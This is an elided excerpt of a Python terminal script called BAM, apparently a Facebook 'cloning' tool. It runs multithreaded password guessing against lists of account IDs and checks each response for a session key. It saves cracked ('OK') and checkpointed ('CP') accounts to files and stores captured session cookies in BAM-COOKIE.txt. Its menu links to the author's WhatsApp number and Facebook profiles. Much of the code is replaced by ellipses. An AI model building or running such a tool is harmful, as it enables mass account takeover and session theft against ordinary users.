...
\033[1;32m  • \033[1;37m Version    :- 1.2 {version}""")
os.system('clear')
...
def Main_BAM():
        ...
        if opt1 == "1": method()
            ...
            if opt== '3':bd()
            if opt== '4':gmail()
            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_BAM()
            ...
            d=input(' [•] Choose : ')
            if d == '1':os.system('xdg-open https://api.whatsapp.com/send?phone=+994409879304/');Main_BAM()
            if d == '2':os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100');Main_BAM()
            ...
            d=input(' [•] Choose : ')
            if d == '1':os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi');Main_BAM()
            if d == '2':os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi');Main_BAM()
            if d == '0':Main_BAM()
            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_BAM()
...
def method():
    ...
    with tred(max_workers=30) as BAM:
        clear()
        tl = str(len(fo))
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                BAM.submit(api1,ids,names,passlist)
            #elif methd =='2':
                #BAM.submit(api1,ids,names,passlist)
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as BAM:     
                        ...
                        for psx in user:
                                ...
                                BAM.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/BAM/BAM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/BAM/BAM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python BAM.py')
    ...
    try:
        ...
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        file_path_cookies = os.path.join(folder_path, 'BAM-COOKIE.txt')
